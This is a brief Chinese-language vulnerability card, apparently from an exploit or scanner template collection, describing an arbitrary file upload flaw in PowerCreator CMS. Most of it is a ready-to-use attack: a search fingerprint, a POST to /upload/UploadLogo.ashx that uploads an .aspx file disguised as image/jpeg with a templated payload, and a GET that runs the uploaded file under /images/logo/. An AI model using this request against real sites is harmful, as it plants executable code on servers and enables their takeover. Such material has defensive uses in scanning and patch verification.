# PowerCreatorCMSUploadLogo存在任意文件上传漏洞

- **系统**：PowerCreatorCMSUploadLogo　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"PowerCreator-CMS"`
- **请求**：`POST /upload/UploadLogo.ashx?fileName=123.aspx HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`　`Content-Length: 245`　`Content-Disposition: form-data;name="file1";filename="poc.aspx";`　`Content-Type: multipart/form-data; boundary=---------------------------208…`

**请求体 / payload**
```
-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file"; filename="poc.aspx"
Content-Type: image/jpeg
{{payload}}
-----------------------------20873900192357278038549710136--
GET /images/logo/123.aspx HTTP/1.1
Host: {{Hostname}}
```